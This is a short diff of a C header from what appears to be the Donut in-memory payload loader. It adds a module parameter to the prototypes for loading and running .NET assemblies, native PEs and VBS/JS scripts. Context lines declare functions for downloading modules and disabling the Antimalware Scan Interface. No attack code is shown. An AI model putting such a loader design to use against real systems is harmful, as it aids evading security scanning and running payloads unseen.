@@ -124,15 +124,15 @@ typedef struct _DONUT_ASSEMBLY {
     BOOL DownloadModule(PDONUT_INSTANCE);
     
     // .NET DLL/EXE
-    BOOL LoadAssembly(PDONUT_INSTANCE, PDONUT_ASSEMBLY);
-    BOOL RunAssembly(PDONUT_INSTANCE,  PDONUT_ASSEMBLY);
+    BOOL LoadAssembly(PDONUT_INSTANCE, PDONUT_MODULE, PDONUT_ASSEMBLY);
+    BOOL RunAssembly(PDONUT_INSTANCE,  PDONUT_MODULE, PDONUT_ASSEMBLY);
     VOID FreeAssembly(PDONUT_INSTANCE, PDONUT_ASSEMBLY);
 
     // In-Memory execution of native DLL
-    VOID RunPE(PDONUT_INSTANCE);
+    VOID RunPE(PDONUT_INSTANCE, PDONUT_MODULE);
     
     // VBS / JS files
-    VOID RunScript(PDONUT_INSTANCE);
+    VOID RunScript(PDONUT_INSTANCE, PDONUT_MODULE);
 
     // Disables Antimalware Scan Interface
     BOOL DisableAMSI(PDONUT_INSTANCE);
